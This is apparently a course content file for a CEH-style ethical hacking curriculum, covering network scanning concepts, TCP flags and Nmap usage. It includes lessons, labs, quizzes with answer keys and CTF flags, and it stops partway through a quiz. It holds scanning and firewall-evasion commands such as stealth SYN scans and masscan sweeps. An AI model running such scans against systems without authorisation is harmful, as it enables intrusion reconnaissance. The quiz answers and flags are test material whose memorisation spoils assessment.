    "prerequisites": [
      "Module 01 - Intro to Ethical Hacking"
    ],
    "lastReviewed": "2026-07-21"
  },
  "objectives": [
    "Master the fundamental concepts.",
    "Apply tools in an enterprise context.",
    "Validate knowledge through practical assessment."
  ],
  "pitfalls": [
    {
      "icon": "\u26a0\ufe0f",
      "title": "Relying solely on automated tools",
      "desc": "Automated tools often miss nuanced misconfigurations that a manual review would catch.",
      "fix": "Always manually verify the output of automated scanners against raw data."
    },
    {
      "icon": "\u26a0\ufe0f",
      "title": "Violating Rules of Engagement (ROE)",
      "desc": "Active footprinting outside the defined scope can lead to legal consequences.",
      "fix": "Double-check IP ranges and target domains against the signed ROE document before executing any active probe."
    }
  ],
  "summary": [
    "Reconnaissance is the foundation of all successful engagements.",
    "Passive OSINT provides stealthy insights without triggering alerts.",
    "Always cross-reference multiple data sources to eliminate false positives.",
    "Map findings to the MITRE ATT&CK framework for enterprise reporting."
  ],
  "ctf": {
    "scenario": "An exposed backup file was found on the target web server during recon. Analyze the file to extract the hidden flag.",
    "hint": "Look for Base64 encoded strings in the configuration block.",
    "flag": "CEH{r3c0n_m4st3r}",
    "points": 200
  }
};






// MODULE 03 — Scanning Networks
// =================================================================

CONTENT['network-scanning-overview'] = {
  module:'Module 03 · Scanning Networks',
  title:'Network Scanning Concepts',
  sub:'Moving from passive reconnaissance to active probing.',
  killchain:{phase:'Scanning',mitre:'TA0046 — Discovery',desc:'Scanning is the first time the attacker directly touches the target network, generating traffic that can be detected by defensive systems.'},
  learn:{
    simple:'Network scanning is the process of actively sending packets to a target network to discover live hosts, open ports, and running services. It transitions from the "detective work" of footprinting to "testing the door handles".',
    analogy:'If footprinting is reading the blueprints of a building, scanning is walking through the hallways, knocking on every door to see which ones are unlocked, and asking the people inside who they are.',
    why:'Footprinting only tells you what the target owns. Scanning tells you what is actually turned on, exposed to the internet, and potentially vulnerable. Without scanning, you cannot identify specific services to exploit.',
    architecture:'Scanning involves three distinct steps: 1. Host Discovery (is the IP alive? e.g., Ping Sweep), 2. Port Scanning (what ports are open on the live host? e.g., TCP SYN Scan), 3. Service Versioning/OS Fingerprinting (what software is running on the open port?).'
  },
  diagram:{
    title:'The Scanning Methodology Lifecycle',
    steps:[
      {icon:'📡',label:'1. Check for Live Systems',desc:'Host discovery using ICMP ping sweeps, ARP pings (local), or TCP ACK probes to see which IP addresses are active.'},
      {icon:'🚪',label:'2. Check for Open Ports',desc:'Port scanning (Nmap) on live hosts to identify open TCP/UDP ports.'},
      {icon:'📄',label:'3. Identify Services',desc:'Banner grabbing and service version detection to determine what application (e.g., Apache 2.4, OpenSSH 7.2) is running on the open ports.'},
      {icon:'🗺️',label:'4. Identify OS',desc:'OS Fingerprinting by analyzing the TCP/IP stack response to determine if the host is Windows, Linux, network gear, etc.'},
      {icon:'🔍',label:'5. Vulnerability Scan',desc:'Using tools like Nessus or OpenVAS to check identified services against known vulnerabilities (CVEs).'},
      {icon:'🧩',label:'6. Map Network',desc:'Drawing a network topology map based on traceroute and discovered hosts/routers.'}
    ]
  },
  enterprise:{
    role:'You are the Lead Penetration Tester for GlobalFinSec Corp.',
    situation:'You have been given a /24 subnet (256 IP addresses) and authorized to begin the active scanning phase.',
    challenge:'Execute a methodical scanning process that identifies all live hosts, open ports, and services without overwhelming the network or crashing fragile legacy systems.',
    steps:[
      'Host Discovery: Run a gentle ICMP ping sweep (nmap -sn 10.0.0.0/24) to find live hosts.',
      'Port Scanning: For the live hosts, run a stealth SYN scan for the top 1,000 ports (nmap -sS -iL live_hosts.txt).',
      'Service Enumeration: For the open ports discovered, run version detection (nmap -sV -p [open_ports] -iL live_hosts.txt).',
      'OS Fingerprinting: Run OS detection (nmap -O -iL live_hosts.txt) to identify the operating systems.',
      'Document: Compile all findings into a network map showing hosts, OS, open ports, and running services.'
    ],
    outcome:'The methodical approach identified 42 live hosts. By avoiding aggressive scanning (like nmap -A against the whole subnet), you avoided crashing the legacy SCADA systems present on the network, which are known to fall over when aggressively port scanned.',
    lesson:'Never jump straight to aggressive vulnerability scanning or full port scans across an entire subnet. Follow the methodology: Discover Hosts -> Scan Ports -> Enumerate Services. This is safer and much faster.'
  },
  tools:[
    {name:'Nmap',cmd:'nmap 192.168.1.1',desc:'The industry standard network scanner'},
    {name:'Masscan',cmd:'masscan -p1-65535 10.0.0.0/8 --rate=10000',desc:'Extremely fast scanner for large networks'},
    {name:'Angry IP Scanner',cmd:'ipscan',desc:'Fast, GUI-based ping sweeper and port scanner'},
    {name:'Netdiscover',cmd:'netdiscover -r 192.168.1.0/24',desc:'ARP-based host discovery for local networks'}
  ],
  commands:{
    win:['ping 192.168.1.1','tracert 192.168.1.1','arp -a'],
    lin:['nmap -sn 192.168.1.0/24','netdiscover -r 192.168.1.0/24','ping -c 4 192.168.1.1','arp-scan --localnet']
  },
  pitfalls:[
    {icon:'⚠️',title:'Scanning Before Footprinting',desc:'Running Nmap before performing OSINT is a rookie mistake. It instantly alerts the target\'s SOC and burns your IP address.',fix:'Always exhaust passive footprinting before sending a single packet to the target. Active scanning should be highly targeted based on footprinting results.'},
    {icon:'🔴',title:'Assuming Un-Pingable Means Dead',desc:'Many firewalls block ICMP Echo Requests (ping). If a ping sweep shows a host is down, students often assume there is no server there.',fix:'Never rely solely on ICMP for host discovery. Use TCP ACK ping (nmap -PA) or TCP SYN ping (nmap -PS) to bypass firewalls that block ICMP.'},
    {icon:'⛔',title:'Scanning Fragile Systems Aggressively',desc:'Running intense, full-port vulnerability scans against IoT devices, medical equipment, or SCADA systems can cause them to crash or reboot, disrupting business operations.',fix:'Identify fragile systems early. Exclude them from automated scanning or use highly targeted, slow, TCP connect scans instead of aggressive SYN scans.'},
    {icon:'🎭',title:'Ignoring UDP Ports',desc:'Scanning all 65,535 TCP ports takes time, so testers often skip UDP scanning entirely. UDP hosts critical services like DNS, SNMP, and TFTP.',fix:'Always include UDP scanning (nmap -sU) for at least the top 100 ports. SNMP (UDP 161) is often a goldmine for information.'}
  ],
  lab:{
    title:'Lab: Basic Network Discovery',
    difficulty:'Beginner',
    duration:'20 min',
    objectives:['Perform a ping sweep to discover live hosts','Understand how firewalls block ICMP','Use ARP scanning for local host discovery'],
    steps:[
      'Run a standard ping sweep: nmap -sn 192.168.1.0/24 (replace with your lab subnet).',
      'Note the number of hosts discovered.',
      'Run an ARP scan (only works on local subnet): arp-scan --localnet (Linux) or arp -a (Windows).',
      'Compare the results. ARP scanning cannot be blocked by host firewalls on the same subnet.',
      'Try a TCP ACK ping to bypass potential ICMP blocks: nmap -PA80 192.168.1.0/24'
    ],
    validation:'You should understand that ICMP (ping) is often blocked by default (e.g., Windows Defender Firewall), and alternative discovery methods like ARP (local) or TCP Ping are necessary.'
  },
  quiz:[
    {q:'What is the primary difference between footprinting and scanning?',opts:['Footprinting is active, scanning is passive','Footprinting gathers public information without direct contact; scanning actively sends packets to the target','Footprinting cracks passwords; scanning finds them','There is no difference'],correct:1,fb:'Footprinting (reconnaissance) relies on OSINT and avoids contacting the target. Scanning involves directly probing the target network with packets.'},
    {q:'What is the purpose of a "Ping Sweep"?',opts:['To crash the target network','To identify which IP addresses on a subnet represent active, live hosts','To extract passwords from a server','To bypass a firewall'],correct:1,fb:'A ping sweep sends ICMP Echo Requests to a range of IP addresses to determine which ones are alive and responding.'},
    {q:'If a target blocks ICMP packets, what will happen during a standard ping sweep?',opts:['The firewall will crash','The hosts will appear as "down" or offline, even if they are active','The ping sweep will automatically switch to UDP','The attacker\'s IP will be blocked'],correct:1,fb:'If ICMP is blocked, the target will not reply to the ping sweep, leading the scanner to falsely conclude the host is offline.'},
    {q:'Which Nmap flag is used to perform a ping sweep (host discovery only, no port scanning)?',opts:['-sS','-p-','-sn (formerly -sP)','-O'],correct:2,fb:'The -sn flag tells Nmap not to perform a port scan after host discovery, effectively making it a ping sweep.'},
    {q:'In the scanning methodology, what step immediately follows finding live hosts?',opts:['Vulnerability scanning','Port scanning','Exploitation','OS Fingerprinting'],correct:1,fb:'Once you know which hosts are alive (Host Discovery), the next logical step is to determine which ports are open on those live hosts (Port Scanning).'},
    {q:'What does OS Fingerprinting do?',opts:['Identifies the human user logged into the system','Analyzes the TCP/IP stack response to determine the target\'s Operating System (Windows, Linux, etc.)','Steals biometric data','Checks for known CVEs'],correct:1,fb:'Different operating systems implement the TCP/IP stack slightly differently. By analyzing responses to malformed or specific packets, scanners can identify the OS.'},
    {q:'Why might an attacker use ARP scanning instead of ICMP pinging on a local network?',opts:['ARP scanning is faster','ARP requests cannot be routed over the internet','ARP operates at Layer 2 and cannot be blocked by standard host-based firewalls like ICMP can','All of the above'],correct:3,fb:'ARP scanning is extremely fast, only works on local subnets (Layer 2), and bypasses host firewalls (like Windows Defender) that typically block ICMP.'},
    {q:'What is a risk of aggressive network scanning (e.g., scanning all 65k ports quickly)?',opts:['It might accidentally fix a vulnerability','It is very noisy and likely to be detected by IDS/IPS or crash fragile systems','It encrypts the network traffic','It is illegal in all countries'],correct:1,fb:'Aggressive scanning generates massive amounts of traffic, triggering Intrusion Detection Systems and potentially causing denial-of-service on legacy or fragile systems (like SCADA).'},
    {q:'Which tool is designed to scan the entire internet (or massive subnets) in a matter of minutes?',opts:['Nmap','Wireshark','Masscan','Netcat'],correct:2,fb:'Masscan is an asynchronous scanner capable of scanning the entire IPv4 internet in under 6 minutes, whereas Nmap is designed for deeper, more accurate scanning of smaller scopes.'},
    {q:'What is the final step in the scanning methodology before moving to exploitation?',opts:['Ping sweep','Vulnerability scanning (mapping discovered services to known CVEs)','Port scanning','WHOIS lookup'],correct:1,fb:'After discovering hosts, ports, and services, the final step is vulnerability scanning (using tools like Nessus) to see if those specific service versions have known vulnerabilities.'}
  ],
  flashcards:[
    {f:'Network Scanning',b:'Active probing of a target network to discover live hosts, open ports, and running services.'},
    {f:'Ping Sweep',b:'Sending ICMP Echo Requests to a range of IPs to determine which hosts are active.'},
    {f:'Host Discovery',b:'The first phase of scanning — identifying which IP addresses are alive on the network.'},
    {f:'Port Scanning',b:'The second phase of scanning — probing a live host to see which TCP/UDP ports are open.'},
    {f:'OS Fingerprinting',b:'Analyzing variations in TCP/IP packet responses to determine the target\'s operating system.'},
    {f:'ARP Scanning',b:'Layer 2 host discovery. Only works on local networks but bypasses host-based firewalls that block ICMP.'},
    {f:'Masscan',b:'An extremely fast, asynchronous port scanner designed to scan massive networks or the entire internet quickly.'},
    {f:'Nmap -sn',b:'The Nmap flag to perform a ping sweep (host discovery only, disable port scanning).'}
  ],
  ctf:{
    scenario:'You need to find a live host on the 10.10.10.0/24 subnet that is blocking ICMP (ping). You use Nmap to perform a TCP SYN ping on port 80. What is the Nmap flag for a TCP SYN ping?',
    hint:'The flag starts with -P and ends with the first letter of SYN.',
    flag:'CEH{n3tw0rk_sc4n_0v3rv13w}',
    points:150
  },
  summary:[
    'Scanning is active — you are sending packets to the target and they can log your IP.',
    'Methodology order: Host Discovery -> Port Scanning -> Service/OS Detection -> Vulnerability Scan.',
    'Never assume a host is down just because it doesn\'t respond to ping (ICMP). Firewalls block ICMP by default.',
    'Use alternative discovery (TCP ACK, TCP SYN, ARP) to bypass basic ICMP blocking.',
    'Aggressive scanning crashes fragile systems (SCADA/IoT) and triggers SOC alerts.',
    'Masscan is for speed/scale; Nmap is for accuracy and deep enumeration.',
    'Vulnerability scanning maps the discovered services to known CVEs for exploitation.'
  ]
};

CONTENT['tcp-ip-scanning'] = {
  module:'Module 03 · Scanning Networks',
  title:'TCP/IP & Port Scanning',
  sub:'Understanding the protocols behind the packets to manipulate network responses.',
  killchain:{phase:'Scanning',mitre:'T1046 — Network Service Discovery',desc:'Port scanning relies entirely on manipulating the TCP 3-way handshake and analyzing how target systems respond to unexpected flags.'},
  learn:{
    simple:'Port scanning works by sending specific TCP or UDP packets to a target port and analyzing the response. To understand port scanning, you must perfectly understand the TCP 3-way handshake (SYN, SYN-ACK, ACK) and the TCP flags.',
    analogy:'TCP is like making a phone call: You say "Hello?" (SYN). They reply "Hello, who is this?" (SYN-ACK). You say "It\'s me, let\'s talk." (ACK). Port scanning is calling every extension in a building. If they answer (SYN-ACK), the port is open. If you get a disconnected tone (RST), the port is closed. If it rings forever (no response), a firewall dropped the call.',
    why:'Different types of scans (Full Connect, Stealth SYN, XMAS, FIN) manipulate these TCP flags differently to bypass firewalls or avoid logging. If you don\'t understand TCP/IP, you are just blindly running tools without understanding why they work or why they fail.',
    architecture:'A TCP packet header contains 6 crucial flags: URG (Urgent), ACK (Acknowledgment), PSH (Push), RST (Reset), SYN (Synchronize), FIN (Finish). Mnemonic: Unskilled Attackers Pester Real Security Folk. The state of these flags determines how firewalls and operating systems handle the packet.'
  },
  diagram:{
    title:'The TCP 3-Way Handshake vs Port Scanning',
    steps:[
      {icon:'🤝',label:'Normal Connection',desc:'1. Attacker sends SYN. 2. Target replies SYN-ACK. 3. Attacker replies ACK. Connection established. (Logged by target).'},
      {icon:'🔓',label:'TCP Connect Scan',desc:'Completes the full 3-way handshake. Reliable, but creates a full connection log on the target system (Noisy).'},
      {icon:'🥷',label:'Stealth SYN Scan',desc:'1. Attacker sends SYN. 2. Target replies SYN-ACK. 3. Attacker sends RST to tear it down before connecting. (Often avoids application logs).'},
      {icon:'⛔',label:'Closed Port Response',desc:'If an attacker sends a SYN to a closed port, the target OS complies with RFC 793 and replies with an RST (Reset).'},
      {icon:'🛡️',label:'Filtered (Firewall)',desc:'If a firewall blocks the port, it drops the packet. The attacker receives no response (timeout), marking the port "Filtered".'},
      {icon:'🎄',label:'XMAS Scan',desc:'Sends a packet with FIN, PSH, and URG flags set (lit up like a Christmas tree). Bypasses some stateless firewalls. Windows ignores it; Linux replies RST if closed, no response if open.'}
    ]
  },
  enterprise:{
    role:'You are a Blue Team SOC Analyst at GlobalFinSec Corp.',
    situation:'Your IDS alerts on a massive spike in inbound TCP traffic directed at your web server (10.0.0.50). The traffic consists entirely of TCP SYN packets. The server is responding with SYN-ACK to port 80 and 443, and RST to all other ports. The attacker immediately follows the SYN-ACKs with an RST packet.',
    challenge:'Analyze the traffic to determine what type of attack is occurring and what the attacker has learned.',
    steps:[
      'Analyze traffic pattern: Massive SYN packets to all ports = Port Scan.',
      'Analyze responses: Server sends SYN-ACK for 80/443 (ports are open). Server sends RST for other ports (ports are closed).',
      'Analyze attacker follow-up: Attacker sends RST after receiving SYN-ACK. They did not complete the 3-way handshake.',
      'Conclusion: This is a TCP Stealth SYN scan (Half-open scan).',
      'Impact Assessment: The attacker now knows ports 80 and 443 are open, but because they tore down the connection with an RST, the Apache web server did not log a connection attempt.'
    ],
    outcome:'You correctly identified a stealth SYN scan. You updated the firewall rules to implement rate limiting on SYN packets to slow down future scans, and configured the IDS to alert specifically on half-open connection attempts.',
    lesson:'Understanding TCP flags is critical for both offense and defense. Attackers manipulate flags to evade logging, while defenders analyze flags to detect the scanning methodology.'
  },
  tools:[
    {name:'Wireshark',cmd:'wireshark',desc:'Used to analyze the exact TCP flags sent and received during a scan'},
    {name:'tcpdump',cmd:'tcpdump -i eth0 tcp[tcpflags] == tcp-syn',desc:'Command-line packet analyzer'},
    {name:'Nmap',cmd:'nmap -sS target',desc:'Executes the various TCP scan types'}
  ],
  commands:{
    win:['netstat -an | find "LISTENING"','Get-NetTCPConnection'],
    lin:['netstat -tulpn','ss -tulpn','tcpdump -i any tcp port 80']
  },
  pitfalls:[
    {icon:'⚠️',title:'Confusing "Closed" with "Filtered"',desc:'Students often think a firewall sends an RST packet. Usually, a firewall drops the packet entirely (Filtered/Timeout). A target operating system sends the RST when a port is closed but reachable.',fix:'Understand the difference: RST = Reached the server, but port is closed. Timeout = Blocked by a firewall along the way (Filtered).'},
    {icon:'🔴',title:'Assuming SYN Scans are Invisible',desc:'SYN scans ("stealth" scans) do not complete the 3-way handshake, so the application (like Apache) doesn\'t log the connection. However, modern Firewalls and IDS/IPS log SYN scans easily.',fix:'Do not assume "stealth" in Nmap means undetectable. It only bypasses application-level logging, not network-level detection.'},
    {icon:'⛔',title:'Using XMAS/FIN Scans on Windows Targets',desc:'XMAS and FIN scans rely on RFC 793 behavior where a closed port replies with RST to an unexpected flag, and an open port ignores it. Windows does not follow this RFC strictly and replies RST to everything.',fix:'Never use XMAS, FIN, or NULL scans against Windows targets. They will incorrectly report all ports as closed. Use SYN scans.'},
    {icon:'🎭',title:'Not Knowing the 6 TCP Flags',desc:'You cannot pass the CEH or analyze network traffic without knowing the TCP flags and the 3-way handshake by heart.',fix:'Memorize: URG, ACK, PSH, RST, SYN, FIN (Unskilled Attackers Pester Real Security Folk).'}
  ],
  lab:{
    title:'Lab: Analyze a SYN Scan in Wireshark',
    difficulty:'Intermediate',
    duration:'30 min',
    objectives:['Perform a SYN scan and a Connect scan','Capture the traffic in Wireshark','Analyze the TCP flags for both scan types'],
    steps:[
      'Start Wireshark and begin capturing on your main interface.',
      'Run a TCP Connect scan against a practice target (e.g., scanme.nmap.org): nmap -sT -p 80 scanme.nmap.org',
      'Run a TCP SYN scan: nmap -sS -p 80 scanme.nmap.org (requires sudo/root).',
      'Stop the Wireshark capture.',
      'Filter Wireshark for the Connect scan (ip.addr == [target IP]). Observe the SYN -> SYN-ACK -> ACK handshake.',
      'Filter Wireshark for the SYN scan. Observe the SYN -> SYN-ACK -> RST pattern.'
    ],
    validation:'You should visually verify in Wireshark that the Connect scan finishes with an ACK (completing the handshake), while the SYN scan finishes with an RST (tearing it down).'
  },
  quiz:[
    {q:'What are the three steps of the standard TCP 3-way handshake?',opts:['SYN, ACK, FIN','SYN, SYN-ACK, ACK','ACK, SYN, RST','SYN, FIN, ACK'],correct:1,fb:'The 3-way handshake establishes a TCP connection: Client sends SYN, Server replies SYN-ACK, Client replies ACK.'},
    {q:'Which TCP flag is used to immediately tear down or abort a connection?',opts:['FIN','URG','RST','PSH'],correct:2,fb:'The RST (Reset) flag immediately aborts a connection. It is sent when a connection is refused, a port is closed, or an attacker tears down a half-open scan.'},
    {q:'How does a TCP Connect Scan (-sT) differ from a TCP SYN Scan (-sS)?',opts:['Connect scan uses UDP; SYN scan uses TCP','Connect scan completes the full 3-way handshake; SYN scan tears it down with an RST before completion','Connect scan is faster than a SYN scan','SYN scan requires no privileges; Connect scan requires root'],correct:1,fb:'Connect scan (-sT) sends SYN, receives SYN-ACK, and sends ACK (completing the connection). SYN scan (-sS) sends SYN, receives SYN-ACK, and sends RST (half-open, preventing application logging).'},
    {q:'If you send a TCP SYN packet to a closed port on a server with no firewall, what response should you expect according to RFC 793?',opts:['No response (Timeout)','SYN-ACK','FIN','RST'],correct:3,fb:'According to TCP standards, a system should respond to a SYN request on a closed port with an RST (Reset) packet.'},
    {q:'In Nmap, what does the port state "Filtered" indicate?',opts:['The port is open and running a service','The port is closed and sent an RST','Nmap received no response, indicating a firewall is dropping the packets','The port requires a password to access'],correct:2,fb:'"Filtered" means Nmap cannot determine if the port is open or closed because packet filtering (a firewall) is preventing the probes from reaching the port or the responses from returning.'},
    {q:'Which TCP flags are set in an XMAS scan?',opts:['SYN, ACK, FIN','FIN, PSH, URG','RST, SYN, ACK','All 6 flags are set'],correct:1,fb:'An XMAS scan sets the FIN, PSH, and URG flags (lighting the packet up like a Christmas tree). It is designed to bypass stateless firewalls and OS fingerprinting.'},
    {q:'Why do XMAS, FIN, and NULL scans fail to accurately map Windows targets?',opts:['Windows blocks all ICMP traffic','Windows does not implement TCP/IP','Windows operating systems respond with an RST to all these malformed packets regardless of port state','Windows immediately blue screens when receiving these packets'],correct:2,fb:'Windows does not strictly follow RFC 793 for these specific malformed packets. It replies with an RST whether the port is open or closed, making these scans useless against Windows.'},
    {q:'Why is a TCP SYN scan often called a "stealth" scan?',opts:['Because it encrypts the packets','Because it spoofs the source IP address','Because it does not complete the 3-way handshake, bypassing application-level connection logs','Because it uses UDP instead of TCP'],correct:2,fb:'Because the connection is never fully established (the attacker sends an RST instead of an ACK), the application (like a web server or FTP server) usually does not log the connection attempt.'},
    {q:'Which mnemonic helps remember the 6 TCP flags in order?',opts:['Please Do Not Throw Sausage Pizza Away','Unskilled Attackers Pester Real Security Folk','All People Seem To Need Data Processing','Some People Fear Really Angry Unicorns'],correct:1,fb:'Unskilled Attackers Pester Real Security Folk stands for: URG, ACK, PSH, RST, SYN, FIN.'},
    {q:'What is the TCP FIN flag used for?',opts:['To initiate a connection','To gracefully terminate a connection when data transfer is complete','To indicate urgent data','To immediately abort a connection'],correct:1,fb:'The FIN (Finish) flag initiates a graceful termination of a TCP connection, unlike RST which abruptly aborts it.'}
  ],
  flashcards:[
    {f:'TCP 3-Way Handshake',b:'SYN -> SYN-ACK -> ACK. The process to establish a reliable TCP connection.'},
    {f:'SYN Flag',b:'Synchronize. Initiates a connection and synchronizes sequence numbers.'},
    {f:'RST Flag',b:'Reset. Immediately aborts a connection. Sent by closed ports or used to tear down half-open scans.'},
    {f:'TCP Connect Scan (-sT)',b:'Completes the full 3-way handshake. Reliable but noisy (creates application logs). Does not require root.'},
    {f:'TCP SYN Scan (-sS)',b:'Half-open scan. Sends SYN, receives SYN-ACK, replies RST. Bypasses application logs. Requires root.'},
    {f:'Filtered Port',b:'Nmap state indicating a firewall is dropping packets (no response received).'},
    {f:'XMAS Scan',b:'Sets FIN, PSH, URG flags. Works against Linux/Unix, but fails against Windows (which replies RST to everything).'},
    {f:'FIN Flag',b:'Finish. Gracefully terminates a TCP connection.'}
  ],
  ctf:{
    scenario:'You run an XMAS scan against a target. Every single port reports as "closed". You then run a SYN scan, and it reports several ports as "open". Based on TCP RFC behavior, what Operating System is the target most likely running?',
    hint:'Which OS does not follow RFC 793 for malformed packets and responds with RST to everything?',
    flag:'CEH{tcp_1p_p0rt_sc4nn3r}',
    points:150
  },
  summary:[
    'Port scanning is entirely based on manipulating TCP flags and analyzing the response.',
    'The 3-way handshake is SYN, SYN-ACK, ACK.',
    'Closed ports reply with RST. Filtered ports drop the packet (Timeout).',
    'Connect Scans (-sT) complete the handshake and are logged by applications.',
    'SYN Scans (-sS) tear down the handshake with an RST, bypassing application logs (but not IDS).',
    'XMAS, FIN, and NULL scans manipulate unexpected flags to bypass firewalls, but fail against Windows.',
    'Memorize the flags: URG, ACK, PSH, RST, SYN, FIN.'
  ]
};

CONTENT['nmap-techniques'] = {
  module:'Module 03 · Scanning Networks',
  title:'Nmap Scanning Techniques',
  sub:'Mastering the industry-standard network mapper.',
  killchain:{phase:'Scanning',mitre:'T1046 — Network Service Discovery',desc:'Nmap is the definitive tool for the scanning phase. Mastery of its flags is non-negotiable for penetration testing.'},
  learn:{
    simple:'Nmap (Network Mapper) is the Swiss Army knife of network scanning. It discovers hosts, scans ports, detects service versions, identifies operating systems, and even runs vulnerability scripts. Learning Nmap is learning the language of network reconnaissance.',
    analogy:'If a network is a neighborhood, Nmap is a drone that flies over, maps every house, checks which doors are unlocked, looks through the windows to see what brand of TV they have, and reads the manufacturer\'s label on the security system.',
    why:'You cannot pass the CEH exam or work in cybersecurity without knowing Nmap syntax. It is universally used by attackers to find vulnerabilities and by defenders to audit their own networks. Different scenarios require different Nmap flags to balance speed, stealth, and accuracy.',
    architecture:'Nmap operates in phases: 1. Target resolution (DNS), 2. Host discovery (Ping sweep), 3. Port scanning (SYN/Connect), 4. Service/Version detection, 5. OS detection, 6. Nmap Scripting Engine (NSE) execution. You control these phases using command-line flags.'
  },
  diagram:{
    title:'Essential Nmap Flags Anatomy',
    steps:[
      {icon:'📡',label:'Discovery: -sn',desc:'Ping sweep (No port scan). Just tells you which IP addresses are online.'},
      {icon:'🔓',label:'Scan Type: -sS / -sT / -sU',desc:'-sS (Stealth SYN, requires root), -sT (TCP Connect, no root), -sU (UDP scan).'},
      {icon:'🎯',label:'Ports: -p',desc:'-p 80,443 (specific), -p 1-1000 (range), -p- (all 65,535 ports). Default is top 1,000.'},
      {icon:'📄',label:'Version & OS: -sV / -O',desc:'-sV (Service Version detection), -O (OS Fingerprinting).'},
      {icon:'⚡',label:'Timing: -T',desc:'-T0 (Paranoid/Slow/Stealthy) to -T5 (Insane/Fast/Aggressive). Default is -T3.'},
      {icon:'📜',label:'Scripts & All: -sC / -A',desc:'-sC (Default NSE scripts), -A (Aggressive: implies -sV, -O, -sC, and traceroute).'}
    ]
  },
  enterprise:{
    role:'You are auditing GlobalFinSec Corp\'s DMZ network (192.168.50.0/24).',
    situation:'The CISO requested a comprehensive map of all services running in the DMZ. The network contains legacy mainframes that crash if scanned too quickly, and an aggressive IPS that blocks noisy scans.',
    challenge:'Construct an Nmap command that balances thoroughness (version detection, OS detection) with safety (timing templates) to map the DMZ without causing an outage or getting blocked.',
    steps:[
      'Avoid -A (Aggressive) as it is too noisy for the IPS and too fast for the legacy mainframes.',
      'Use -sS (SYN scan) for stealth.',
      'Use -sV (Version detection) and -O (OS detection) to meet the requirement for a comprehensive map.',
      'Use -T2 (Polite timing) to slow the scan down, preventing legacy system crashes and flying under the IPS threshold.',
      'Use -p- to ensure no non-standard ports are missed.',
      'Final Command: nmap -sS -sV -O -p- -T2 192.168.50.0/24 -oA dmz_audit'
    ],
    outcome:'The scan took 14 hours to complete due to -T2, but it completed without crashing the mainframe or triggering an IPS block. It discovered a forgotten SSH server running on port 2222 that was missing from the asset inventory.',
    lesson:'Speed, stealth, and accuracy are a triangle; you can only pick two. In enterprise environments, precision and safety (avoiding outages) always trump speed. Never use -T4 or -T5 against fragile infrastructure.'
  },
  tools:[
    {name:'Nmap',cmd:'nmap -sS -p- 10.0.0.1',desc:'Command-line interface'},
    {name:'Zenmap',cmd:'zenmap',desc:'Official Nmap GUI (shows topology maps and saves profiles)'},
    {name:'NSE (Nmap Scripting Engine)',cmd:'nmap --script=vuln target',desc:'Extends Nmap to perform vulnerability scanning and exploitation'}
  ],
  commands:{
    win:['nmap -sT -A target.com'],
    lin:['nmap -sS -sV -O -p- target.com','nmap -sn 10.0.0.0/24','nmap --script=http-title,vuln target.com','nmap -sU -p 161,53,67 target.com']
  },
  pitfalls:[
    {icon:'⚠️',title:'Using -A (Aggressive) Automatically',desc:'Students love nmap -A because it does everything. In the real world, -A is incredibly noisy, triggers every alarm in the SOC, and can disrupt network services.',fix:'Use specific flags (-sV, -sC, -O) instead of -A to understand exactly what traffic you are generating. Reserve -A for CTFs or explicit permission.'},
    {icon:'🔴',title:'Forgetting to Scan All Ports',desc:'By default, Nmap only scans the top 1,000 most common ports. Attackers deliberately hide services on high ports (e.g., a backdoor on port 44444).',fix:'When doing a thorough assessment, always use -p- to scan all 65,535 ports. It takes longer but guarantees you don\'t miss hidden services.'},
    {icon:'⛔',title:'Not Saving Output',desc:'Running a 2-hour scan and forgetting to save the output means you have to run it again, generating twice the noise and wasting time.',fix:'Always use -oA [filename] or -oN [filename] to output results to a file immediately. -oA saves in Normal, XML, and Grepable formats.'},
    {icon:'🎭',title:'Running SYN Scans Without Root/Admin',desc:'A TCP SYN scan (-sS) crafts custom raw packets to tear down the connection. This requires root/administrator privileges.',fix:'If you run Nmap as a normal user, it automatically defaults to a TCP Connect scan (-sT), which is noisier. Always use sudo nmap -sS on Linux.'}
  ],
  lab:{
    title:'Lab: Nmap Flag Mastery',
    difficulty:'Intermediate',
    duration:'30 min',
    objectives:['Execute different scan types','Use timing templates','Save output in multiple formats','Run Nmap scripts'],
    steps:[
      'Run a basic scan on the practice target: nmap scanme.nmap.org',
      'Run a version detection scan on specific ports: nmap -sV -p 80,443,22 scanme.nmap.org',
      'Run a scan saving the output: nmap -sS -O scanme.nmap.org -oN scan_results.txt',
      'Read the output file: cat scan_results.txt',
      'Run an Nmap Scripting Engine (NSE) script to check for vulnerabilities: nmap --script=vuln -p 80 scanme.nmap.org',
      'Try an aggressive, fast scan (observe how noisy it is): nmap -A -T4 scanme.nmap.org'
    ],
    validation:'Review your scan_results.txt. You should clearly see the operating system guess and the exact version of the Apache web server running on the target.'
  },
  quiz:[
    {q:'Which Nmap flag performs a TCP SYN (Stealth) scan?',opts:['-sT','-sS','-sU','-sn'],correct:1,fb:'-sS performs a SYN scan. It requires root/admin privileges because it crafts raw packets to execute the half-open handshake.'},
    {q:'What does the Nmap flag -sV do?',opts:['Scans for vulnerabilities','Performs a stealth scan','Probes open ports to determine service/version info','Saves the output to a file'],correct:2,fb:'-sV (Service Version) sends specific probes to open ports and compares the responses to a database to determine exactly what software (e.g., Apache 2.4.41) is running.'},
    {q:'By default, how many ports does Nmap scan if no port flag is provided?',opts:['All 65,535 ports','Only port 80 and 443','The top 1,000 most common ports','100 ports'],correct:2,fb:'By default, Nmap scans the top 1,000 most common ports. To scan all ports, you must use the -p- flag.'},
    {q:'Which Nmap flag is used to determine the target\'s Operating System?',opts:['-A','-sV','-O','-sO'],correct:2,fb:'-O enables OS Fingerprinting, which analyzes the TCP/IP stack behavior to guess the operating system.'},
    {q:'What does the Nmap flag -T4 represent?',opts:['Scan IPv4 addresses only','Use the Aggressive timing template (faster scan)','Scan using 4 threads','Scan for 4 hours'],correct:1,fb:'The -T flag controls timing templates from 0 (Paranoid/Slowest) to 5 (Insane/Fastest). -T4 is Aggressive and commonly used on reliable networks.'},
    {q:'Which Nmap command will save the scan output in Normal, XML, and Grepable formats simultaneously?',opts:['-oX filename','-oG filename','-oN filename','-oA filename'],correct:3,fb:'-oA (Output All) saves the results in all three major formats (.nmap, .xml, .gnmap) using the provided base filename.'},
    {q:'If you want to run Nmap\'s default set of enumeration and vulnerability scripts against a target, which flag do you use?',opts:['--run-scripts','-sC','-sV','-A'],correct:1,fb:'-sC runs the default set of NSE (Nmap Scripting Engine) scripts. These scripts are safe but actively enumerate services.'},
